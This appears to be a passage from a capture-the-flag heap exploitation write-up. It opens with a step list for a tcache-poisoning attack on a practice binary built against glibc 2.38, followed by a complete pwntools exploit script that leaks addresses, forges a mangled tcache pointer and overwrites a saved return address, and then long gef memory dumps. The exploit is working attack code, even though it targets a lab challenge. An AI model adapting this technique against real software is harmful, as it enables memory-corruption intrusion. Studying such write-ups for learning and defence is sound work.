    *    allocate 4 chunks, first one of size `0x500` (index `0`), second `0x80` (index `2`), third `0x500` (index `1`), fourth `0x80` (index `3`)
    *    use secret/view chunk with chunk at index `0`, get pie/stack infoleak
    *    free two `0x500` chunks (indices `0/1`), insert them into the unsorted bin
    *    view chunk `1`, to get a heap infoleak
    *    free chunk `3`, then `2` (both size `0x80`), insert them into the tcache
   	*    we free two chunks, to increment tcache bin count to `2` for that bin
    *    edit chunk `2` (current tcache bin head), replace with mangled next ptr to `chunks`
    *    allocate two more chunks from the same bin, get ptr to `chunks`
    *    overwrite first ptr in `chunks`, with stack address where `edit_chunk` stores it's return address
    *    in `edit_chunk`, overwrite it's own return address with that of `you_win`, return, and call `you_win`

Here is the exploit code which does all of that:

```
from pwn import *

STACK_CHOICE = 0xd3
PIE_CHOICE = 0x83

target = process("./chall-00")
#gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
    target.recvuntil(MENU_STRING)
    target.sendline(b"1")
    target.recvuntil(b"Enter the chunk size between 0x0-0x5f0:\n")
    target.sendline(bytes(str(chunk_size), "utf-8"))
    target.recvuntil(b"Which chunk spot would you like to allocate?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))


def view_chunk(chunk_idx: int) -> bytes:
    target.recvuntil(MENU_STRING)
    target.sendline(b"2")
    target.recvuntil(b"Which chunk idx would you like?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))
    target.recvuntil(b"Chunk Contents: ")
    contents = target.recvuntil(b"\x0d\x0a")
    return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_contents: bytes) -> None:
    target.recvuntil(MENU_STRING)
    target.sendline(b"3")
    target.recvuntil(b"Which chunk idx would you like?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))
    target.recvuntil(b"Please input new chunk content:\n")
    target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
    target.recvuntil(MENU_STRING)
    target.sendline(b"4")
    target.recvuntil(b"Which chunk idx would you like?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))

def remove_chunk(chunk_idx: int) -> None:
    target.recvuntil(MENU_STRING)
    target.sendline(b"5")
    target.recvuntil(b"Which chunk idx would you like?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret(chunk_idx: int, choice: int) -> None:
    target.recvuntil(MENU_STRING)
    target.sendline(b"6")
    target.recvuntil(b"Which chunk idx would you like?\n")
    target.sendline(bytes(str(chunk_idx), "utf-8"))
    target.recvuntil(b"Choice?\n")
    target.sendline(bytes(str(choice), "utf-8"))

# Allocate our starting 4 chunks
allocate_new_chunk(0x500, 0)
allocate_new_chunk(0x80, 2)
allocate_new_chunk(0x500, 1)
allocate_new_chunk(0x80, 3)

# Get the stack infoleak
secret(0x00, STACK_CHOICE)
chunk_contents = view_chunk(0)
stack_leak_contents = chunk_contents[0:6]
stack_leak = u64(stack_leak_contents + b"\x00"*2)

# Get the pie infoleak
secret(0x00, PIE_CHOICE)
chunk_contents = view_chunk(0)
pie_leak_contents = chunk_contents[0:6]
pie_leak = u64(pie_leak_contents + b"\x00"*2)

# Insert the two 0x500 byte chunks
# into the unsorted bin
# for the heap infoleak
free_chunk(0)
free_chunk(1)

# Get the heap infoleak
chunk_contents = view_chunk(1)
heap_leak_contents = chunk_contents[0:6]
heap_leak = u64(heap_leak_contents + b"\x00"*2)

# Calculate needed addresses, using leaks and offsets
heap_base = heap_leak - 0x16b0
pie_base = pie_leak - 0x173d

win_address = pie_base + 0x12d0
edit_ret_address = stack_leak + 0x38
chunks_address = pie_base + 0x4040

tcache_chunk_address = heap_base + 0x1bd0
mangled_next = (tcache_chunk_address >> 12) ^ chunks_address

print("Stack Leak is: " + hex(stack_leak))
print("Heap Leak is: " + hex(heap_leak))
print("PIE Leak is: " + hex(pie_leak))

print("Mangled Next is: " + hex(mangled_next))
print("Stack Target is: " + hex(edit_ret_address))
print("Win Address is: " + hex(win_address))
print("Chunks Address is: " + hex(chunks_address))

# Insert two chunks into the tcache
free_chunk(3)
free_chunk(2)

# Overwrite next ptr of one of the current tcache head
# to chunks
edit_chunk(2, p64(mangled_next))

# Allocate tcache head, set chunks to next head
allocate_new_chunk(0x80, 4)

# Actually allocate a ptr to bss chunks array
allocate_new_chunk(0x80, 5)

# Overwrite first entry of chunks array with ptr to where
# return address for `edit_chunk` is stored
edit_chunk(5, p64(edit_ret_address))

# From within the `edit_chunk` function
# use `fgets` call to overwrite saved return address
# on the stack, call you_win
edit_chunk(0, p64(win_address))

target.interactive()
```

However, let's see how the memory get's altered as the steps progressed. To do this, I did edit and but breaks (`input`) calls at particular spots within the exploit:

```
gef➤  p chunks
'chunks' has unknown type; cast it to its declared type
gef➤  p (char *)chunks
$1 = 0x56270e6f06c0 ""
gef➤  search-pattern 0x56270e6f06c0
[+] Searching '\xc0\x06\x6f\x0e\x27\x56' in memory
[+] In '/Hackery/shogun/challs/00/chall-00'(0x56270ca4c000-0x56270ca4d000), permission=rw-
  0x56270ca4c040 - 0x56270ca4c058  →   "\xc0\x06\x6f\x0e\x27\x56[...]"
gef➤  x/400g 0x56270e6f06b0
0x56270e6f06b0:    0x0    0x511
0x56270e6f06c0:    0x0    0x0
0x56270e6f06d0:    0x0    0x0
0x56270e6f06e0:    0x0    0x0
0x56270e6f06f0:    0x0    0x0
0x56270e6f0700:    0x0    0x0
0x56270e6f0710:    0x0    0x0
0x56270e6f0720:    0x0    0x0
0x56270e6f0730:    0x0    0x0
0x56270e6f0740:    0x0    0x0
0x56270e6f0750:    0x0    0x0
0x56270e6f0760:    0x0    0x0
0x56270e6f0770:    0x0    0x0
0x56270e6f0780:    0x0    0x0
0x56270e6f0790:    0x0    0x0
0x56270e6f07a0:    0x0    0x0
0x56270e6f07b0:    0x0    0x0
0x56270e6f07c0:    0x0    0x0
0x56270e6f07d0:    0x0    0x0
0x56270e6f07e0:    0x0    0x0
0x56270e6f07f0:    0x0    0x0
0x56270e6f0800:    0x0    0x0
0x56270e6f0810:    0x0    0x0
0x56270e6f0820:    0x0    0x0
0x56270e6f0830:    0x0    0x0
0x56270e6f0840:    0x0    0x0
0x56270e6f0850:    0x0    0x0
0x56270e6f0860:    0x0    0x0
0x56270e6f0870:    0x0    0x0
0x56270e6f0880:    0x0    0x0
0x56270e6f0890:    0x0    0x0
0x56270e6f08a0:    0x0    0x0
0x56270e6f08b0:    0x0    0x0
0x56270e6f08c0:    0x0    0x0
0x56270e6f08d0:    0x0    0x0
0x56270e6f08e0:    0x0    0x0
0x56270e6f08f0:    0x0    0x0
0x56270e6f0900:    0x0    0x0
0x56270e6f0910:    0x0    0x0
0x56270e6f0920:    0x0    0x0
0x56270e6f0930:    0x0    0x0
0x56270e6f0940:    0x0    0x0
0x56270e6f0950:    0x0    0x0
0x56270e6f0960:    0x0    0x0
0x56270e6f0970:    0x0    0x0
0x56270e6f0980:    0x0    0x0
0x56270e6f0990:    0x0    0x0
0x56270e6f09a0:    0x0    0x0
0x56270e6f09b0:    0x0    0x0
0x56270e6f09c0:    0x0    0x0
0x56270e6f09d0:    0x0    0x0
0x56270e6f09e0:    0x0    0x0
0x56270e6f09f0:    0x0    0x0
0x56270e6f0a00:    0x0    0x0
0x56270e6f0a10:    0x0    0x0
0x56270e6f0a20:    0x0    0x0
0x56270e6f0a30:    0x0    0x0
0x56270e6f0a40:    0x0    0x0
0x56270e6f0a50:    0x0    0x0
0x56270e6f0a60:    0x0    0x0
0x56270e6f0a70:    0x0    0x0
0x56270e6f0a80:    0x0    0x0
0x56270e6f0a90:    0x0    0x0
0x56270e6f0aa0:    0x0    0x0
0x56270e6f0ab0:    0x0    0x0
0x56270e6f0ac0:    0x0    0x0
0x56270e6f0ad0:    0x0    0x0
0x56270e6f0ae0:    0x0    0x0
0x56270e6f0af0:    0x0    0x0
0x56270e6f0b00:    0x0    0x0
0x56270e6f0b10:    0x0    0x0
0x56270e6f0b20:    0x0    0x0
0x56270e6f0b30:    0x0    0x0
0x56270e6f0b40:    0x0    0x0
0x56270e6f0b50:    0x0    0x0
0x56270e6f0b60:    0x0    0x0
0x56270e6f0b70:    0x0    0x0
0x56270e6f0b80:    0x0    0x0
0x56270e6f0b90:    0x0    0x0
0x56270e6f0ba0:    0x0    0x0
0x56270e6f0bb0:    0x0    0x0
0x56270e6f0bc0:    0x0    0x91
0x56270e6f0bd0:    0x0    0x0
0x56270e6f0be0:    0x0    0x0
0x56270e6f0bf0:    0x0    0x0
0x56270e6f0c00:    0x0    0x0
0x56270e6f0c10:    0x0    0x0
0x56270e6f0c20:    0x0    0x0
0x56270e6f0c30:    0x0    0x0
0x56270e6f0c40:    0x0    0x0
0x56270e6f0c50:    0x0    0x511
0x56270e6f0c60:    0x0    0x0
0x56270e6f0c70:    0x0    0x0
0x56270e6f0c80:    0x0    0x0
0x56270e6f0c90:    0x0    0x0
0x56270e6f0ca0:    0x0    0x0
0x56270e6f0cb0:    0x0    0x0
0x56270e6f0cc0:    0x0    0x0
0x56270e6f0cd0:    0x0    0x0
0x56270e6f0ce0:    0x0    0x0
0x56270e6f0cf0:    0x0    0x0
0x56270e6f0d00:    0x0    0x0
0x56270e6f0d10:    0x0    0x0
0x56270e6f0d20:    0x0    0x0
0x56270e6f0d30:    0x0    0x0
0x56270e6f0d40:    0x0    0x0
0x56270e6f0d50:    0x0    0x0
0x56270e6f0d60:    0x0    0x0
0x56270e6f0d70:    0x0    0x0
0x56270e6f0d80:    0x0    0x0
0x56270e6f0d90:    0x0    0x0
0x56270e6f0da0:    0x0    0x0
0x56270e6f0db0:    0x0    0x0
0x56270e6f0dc0:    0x0    0x0
0x56270e6f0dd0:    0x0    0x0
0x56270e6f0de0:    0x0    0x0
0x56270e6f0df0:    0x0    0x0
0x56270e6f0e00:    0x0    0x0
0x56270e6f0e10:    0x0    0x0
0x56270e6f0e20:    0x0    0x0
0x56270e6f0e30:    0x0    0x0
0x56270e6f0e40:    0x0    0x0
0x56270e6f0e50:    0x0    0x0
0x56270e6f0e60:    0x0    0x0
0x56270e6f0e70:    0x0    0x0
0x56270e6f0e80:    0x0    0x0
0x56270e6f0e90:    0x0    0x0
0x56270e6f0ea0:    0x0    0x0
0x56270e6f0eb0:    0x0    0x0
0x56270e6f0ec0:    0x0    0x0
0x56270e6f0ed0:    0x0    0x0
0x56270e6f0ee0:    0x0    0x0
0x56270e6f0ef0:    0x0    0x0
0x56270e6f0f00:    0x0    0x0
0x56270e6f0f10:    0x0    0x0
0x56270e6f0f20:    0x0    0x0
0x56270e6f0f30:    0x0    0x0
0x56270e6f0f40:    0x0    0x0
0x56270e6f0f50:    0x0    0x0
0x56270e6f0f60:    0x0    0x0
0x56270e6f0f70:    0x0    0x0
0x56270e6f0f80:    0x0    0x0
0x56270e6f0f90:    0x0    0x0
0x56270e6f0fa0:    0x0    0x0
0x56270e6f0fb0:    0x0    0x0
0x56270e6f0fc0:    0x0    0x0
0x56270e6f0fd0:    0x0    0x0
0x56270e6f0fe0:    0x0    0x0
0x56270e6f0ff0:    0x0    0x0
0x56270e6f1000:    0x0    0x0
0x56270e6f1010:    0x0    0x0
0x56270e6f1020:    0x0    0x0
0x56270e6f1030:    0x0    0x0
0x56270e6f1040:    0x0    0x0
0x56270e6f1050:    0x0    0x0
0x56270e6f1060:    0x0    0x0
0x56270e6f1070:    0x0    0x0
0x56270e6f1080:    0x0    0x0
0x56270e6f1090:    0x0    0x0
0x56270e6f10a0:    0x0    0x0
0x56270e6f10b0:    0x0    0x0
0x56270e6f10c0:    0x0    0x0
0x56270e6f10d0:    0x0    0x0
0x56270e6f10e0:    0x0    0x0
0x56270e6f10f0:    0x0    0x0
0x56270e6f1100:    0x0    0x0
0x56270e6f1110:    0x0    0x0
0x56270e6f1120:    0x0    0x0
0x56270e6f1130:    0x0    0x0
0x56270e6f1140:    0x0    0x0
0x56270e6f1150:    0x0    0x0
0x56270e6f1160:    0x0    0x91
0x56270e6f1170:    0x0    0x0
0x56270e6f1180:    0x0    0x0
0x56270e6f1190:    0x0    0x0
0x56270e6f11a0:    0x0    0x0
0x56270e6f11b0:    0x0    0x0
0x56270e6f11c0:    0x0    0x0
0x56270e6f11d0:    0x0    0x0
0x56270e6f11e0:    0x0    0x0
0x56270e6f11f0:    0x0    0x1ee11
0x56270e6f1200:    0x0    0x0
0x56270e6f1210:    0x0    0x0
0x56270e6f1220:    0x0    0x0
0x56270e6f1230:    0x0    0x0
0x56270e6f1240:    0x0    0x0
0x56270e6f1250:    0x0    0x0
0x56270e6f1260:    0x0    0x0
0x56270e6f1270:    0x0    0x0
0x56270e6f1280:    0x0    0x0
0x56270e6f1290:    0x0    0x0
0x56270e6f12a0:    0x0    0x0
0x56270e6f12b0:    0x0    0x0
0x56270e6f12c0:    0x0    0x0
0x56270e6f12d0:    0x0    0x0
0x56270e6f12e0:    0x0    0x0
0x56270e6f12f0:    0x0    0x0
0x56270e6f1300:    0x0    0x0
0x56270e6f1310:    0x0    0x0
0x56270e6f1320:    0x0    0x0
gef➤  c
```

So starting off, we see our beginning `4` chunks located at `0x56270e6f06c0 / 0x56270e6f0bd0 / 0x56270e6f0c60 / 0x56270e6f1170`. Now let's go ahead and see what it looks like, with the two `0x500` chunks freed `0x56270e6f06c0 / 0x56270e6f0c60`:

```
gef➤  heap bins
─────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────
All tcachebins are empty
───────────────────────────────────────────────── Fastbins for arena at 0x7fb1c4e2cca0 ─────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────── Unsorted Bin for arena at 0x7fb1c4e2cca0 ───────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x56270e6f0c50, bk=0x56270e6f06b0
 →   Chunk(addr=0x56270e6f0c60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56270e6f06c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────────────────────────────────── Small Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────── Large Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x56270e6f0c50
0x56270e6f0c50:    0x0    0x511
0x56270e6f0c60:    0x56270e6f06b0    0x7fb1c4e2cd00
0x56270e6f0c70:    0x0    0x0
0x56270e6f0c80:    0x0    0x0
0x56270e6f0c90:    0x0    0x0
0x56270e6f0ca0:    0x0    0x0
0x56270e6f0cb0:    0x0    0x0
0x56270e6f0cc0:    0x0    0x0
0x56270e6f0cd0:    0x0    0x0
0x56270e6f0ce0:    0x0    0x0
gef➤  x/20g 0x56270e6f06b0
0x56270e6f06b0:    0x0    0x511
0x56270e6f06c0:    0x7fb1c4e2cd00    0x56270e6f0c50
0x56270e6f06d0:    0x0    0x0
0x56270e6f06e0:    0x0    0x0
0x56270e6f06f0:    0x0    0x0
0x56270e6f0700:    0x0    0x0
0x56270e6f0710:    0x0    0x0
0x56270e6f0720:    0x0    0x0
0x56270e6f0730:    0x0    0x0
0x56270e6f0740:    0x0    0x0
```

So we can see our two `0x500` chunks in the unsorted bin. That `0x56270e6f06b0` value at `0x56270e6f0c60` is what we will leak, to get our heap infoleak. Next up, let's see what the tcache looks like after we inserted the other two `0x80` chunks into it:

```
gef➤  heap bins
─────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x56270e6f0bd0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x56270e6f1170, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
───────────────────────────────────────────────── Fastbins for arena at 0x7fb1c4e2cca0 ─────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────── Unsorted Bin for arena at 0x7fb1c4e2cca0 ───────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x56270e6f0c50, bk=0x56270e6f06b0
 →   Chunk(addr=0x56270e6f0c60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56270e6f06c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────────────────────────────────── Small Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────── Large Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000056270ca48000 0x000056270ca49000 0x0000000000000000 r-- /Hackery/shogun/challs/00/chall-00
0x000056270ca49000 0x000056270ca4a000 0x0000000000001000 r-x /Hackery/shogun/challs/00/chall-00
0x000056270ca4a000 0x000056270ca4b000 0x0000000000002000 r-- /Hackery/shogun/challs/00/chall-00
0x000056270ca4b000 0x000056270ca4c000 0x0000000000002000 r-- /Hackery/shogun/challs/00/chall-00
0x000056270ca4c000 0x000056270ca4d000 0x0000000000003000 rw- /Hackery/shogun/challs/00/chall-00
0x000056270e6ef000 0x000056270e710000 0x0000000000000000 rw- [heap]
0x00007fb1c4c00000 0x00007fb1c4c22000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4c22000 0x00007fb1c4d72000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4d72000 0x00007fb1c4dc8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4dc8000 0x00007fb1c4dc9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4dc9000 0x00007fb1c4e2c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4e2c000 0x00007fb1c4e2e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007fb1c4e2e000 0x00007fb1c4e3b000 0x0000000000000000 rw-
0x00007fb1c4ea2000 0x00007fb1c4ea7000 0x0000000000000000 rw-
0x00007fb1c4ea7000 0x00007fb1c4ea8000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fb1c4ea8000 0x00007fb1c4ece000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fb1c4ece000 0x00007fb1c4ed8000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fb1c4ed9000 0x00007fb1c4edb000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007fb1c4edb000 0x00007fb1c4edd000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffeb45a0000 0x00007ffeb45c1000 0x0000000000000000 rw- [stack]
0x00007ffeb45ca000 0x00007ffeb45ce000 0x0000000000000000 r-- [vvar]
0x00007ffeb45ce000 0x00007ffeb45d0000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  x/80g 0x000056270e6ef010
0x56270e6ef010:    0x0    0x2000000000000
0x56270e6ef020:    0x0    0x0
0x56270e6ef030:    0x0    0x0
0x56270e6ef040:    0x0    0x0
0x56270e6ef050:    0x0    0x0
0x56270e6ef060:    0x0    0x0
0x56270e6ef070:    0x0    0x0
0x56270e6ef080:    0x0    0x0
0x56270e6ef090:    0x0    0x0
0x56270e6ef0a0:    0x0    0x0
0x56270e6ef0b0:    0x0    0x0
0x56270e6ef0c0:    0x0    0x56270e6f0bd0
0x56270e6ef0d0:    0x0    0x0
0x56270e6ef0e0:    0x0    0x0
0x56270e6ef0f0:    0x0    0x0
0x56270e6ef100:    0x0    0x0
0x56270e6ef110:    0x0    0x0
0x56270e6ef120:    0x0    0x0
0x56270e6ef130:    0x0    0x0
0x56270e6ef140:    0x0    0x0
0x56270e6ef150:    0x0    0x0
0x56270e6ef160:    0x0    0x0
0x56270e6ef170:    0x0    0x0
0x56270e6ef180:    0x0    0x0
0x56270e6ef190:    0x0    0x0
0x56270e6ef1a0:    0x0    0x0
0x56270e6ef1b0:    0x0    0x0
0x56270e6ef1c0:    0x0    0x0
0x56270e6ef1d0:    0x0    0x0
0x56270e6ef1e0:    0x0    0x0
0x56270e6ef1f0:    0x0    0x0
0x56270e6ef200:    0x0    0x0
0x56270e6ef210:    0x0    0x0
0x56270e6ef220:    0x0    0x0
0x56270e6ef230:    0x0    0x0
0x56270e6ef240:    0x0    0x0
0x56270e6ef250:    0x0    0x0
0x56270e6ef260:    0x0    0x0
0x56270e6ef270:    0x0    0x0
0x56270e6ef280:    0x0    0x0
```

So here, we can see the tcache bin, with a count of `0x02`, and two chunks. Let's see what it looks like when we overwrite the next ptr of the head, with a mangled ptr to `chunks`:


```
gef➤  heap bins
─────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────
Tcachebins[idx=7, size=0x90, count=2] ←  Chunk(addr=0x56270e6f0bd0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x56270ca4c040, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x56270ca4c040]
───────────────────────────────────────────────── Fastbins for arena at 0x7fb1c4e2cca0 ─────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────── Unsorted Bin for arena at 0x7fb1c4e2cca0 ───────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x56270e6f0c50, bk=0x56270e6f06b0
 →   Chunk(addr=0x56270e6f0c60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56270e6f06c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────────────────────────────────── Small Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────── Large Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x56270ca4c040
0x56270ca4c040 <chunks>:    0x56270e6f06c0    0x56270e6f0c60
0x56270ca4c050 <chunks+16>:    0x56270e6f0bd0    0x56270e6f1170
0x56270ca4c060 <chunks+32>:    0x0    0x0
0x56270ca4c070 <chunks+48>:    0x0    0x0
0x56270ca4c080 <chunks+64>:    0x0    0x0
0x56270ca4c090:    0x0    0x0
0x56270ca4c0a0 <chunk_sizes>:    0x50000000500    0x8000000080
0x56270ca4c0b0 <chunk_sizes+16>:    0x0    0x0
0x56270ca4c0c0 <chunk_sizes+32>:    0x0    0x0
0x56270ca4c0d0:    0x0    0x0
gef➤  c
Continuing.
```

So we see, the `0x56270e6f1170` chunk in the tcache has been replaced with `0x56270ca4c040` (address of chunks). Let's go ahead and allocate a chunk from the tcache, so `chunks` will become the new head:

```
gef➤  x/20g 0x56270ca4c040
0x56270ca4c040 <chunks>:    0x56270e6f06c0    0x56270e6f0c60
0x56270ca4c050 <chunks+16>:    0x56270e6f0bd0    0x56270e6f1170
0x56270ca4c060 <chunks+32>:    0x56270e6f0bd0    0x0
0x56270ca4c070 <chunks+48>:    0x0    0x0
0x56270ca4c080 <chunks+64>:    0x0    0x0
0x56270ca4c090:    0x0    0x0
0x56270ca4c0a0 <chunk_sizes>:    0x50000000500    0x8000000080
0x56270ca4c0b0 <chunk_sizes+16>:    0x80    0x0
0x56270ca4c0c0 <chunk_sizes+32>:    0x0    0x0
0x56270ca4c0d0:    0x0    0x0
gef➤  heap bins
─────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────
Tcachebins[idx=1, size=0x30, count=1] ←  Chunk(addr=0x56270ca4c040, size=0x0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  [Corrupted chunk at 0x56270ca4c040]
───────────────────────────────────────────────── Fastbins for arena at 0x7fb1c4e2cca0 ─────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────── Unsorted Bin for arena at 0x7fb1c4e2cca0 ───────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x56270e6f0c50, bk=0x56270e6f06b0
 →   Chunk(addr=0x56270e6f0c60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56270e6f06c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────────────────────────────────── Small Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────── Large Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we see here, that `chunks` (`0x56270ca4c040`) is now the new head. Let's go ahead, and allocate a ptr to it using malloc:

```
gef➤  heap bins
─────────────────────────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────────────────────
[!] Command 'heap bins tcache' failed to execute properly, reason: Cannot access memory at address 0x56226c1fcc7c
───────────────────────────────────────────────── Fastbins for arena at 0x7fb1c4e2cca0 ─────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────── Unsorted Bin for arena at 0x7fb1c4e2cca0 ───────────────────────────────────────────────
[+] unsorted_bins[0]: fw=0x56270e6f0c50, bk=0x56270e6f06b0
 →   Chunk(addr=0x56270e6f0c60, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x56270e6f06c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
──────────────────────────────────────────────── Small Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────────────────────── Large Bins for arena at 0x7fb1c4e2cca0 ────────────────────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x56270ca4c040
0x56270ca4c040 <chunks>:    0x56270e6f06c0    0x0
0x56270ca4c050 <chunks+16>:    0x56270e6f0bd0    0x56270e6f1170
0x56270ca4c060 <chunks+32>:    0x56270e6f0bd0    0x56270ca4c040
0x56270ca4c070 <chunks+48>:    0x0    0x0
0x56270ca4c080 <chunks+64>:    0x0    0x0
0x56270ca4c090:    0x0    0x0
0x56270ca4c0a0 <chunk_sizes>:    0x50000000500    0x8000000080
0x56270ca4c0b0 <chunk_sizes+16>:    0x8000000080    0x0
0x56270ca4c0c0 <chunk_sizes+32>:    0x0    0x0
0x56270ca4c0d0:    0x0    0x0
gef➤  x/80g 0x000056270e6ef010
0x56270e6ef010:    0x0    0x0
0x56270e6ef020:    0x0    0x0
0x56270e6ef030:    0x0    0x0
0x56270e6ef040:    0x0    0x0
0x56270e6ef050:    0x0    0x0
0x56270e6ef060:    0x0    0x0
0x56270e6ef070:    0x0    0x0
0x56270e6ef080:    0x0    0x0
0x56270e6ef090:    0x0    0x0
0x56270e6ef0a0:    0x0    0x0
0x56270e6ef0b0:    0x0    0x0
0x56270e6ef0c0:    0x0    0x56226c1fcc8c
0x56270e6ef0d0:    0x0    0x0
0x56270e6ef0e0:    0x0    0x0
0x56270e6ef0f0:    0x0    0x0
0x56270e6ef100:    0x0    0x0
0x56270e6ef110:    0x0    0x0
0x56270e6ef120:    0x0    0x0
0x56270e6ef130:    0x0    0x0
0x56270e6ef140:    0x0    0x0
0x56270e6ef150:    0x0    0x0
0x56270e6ef160:    0x0    0x0
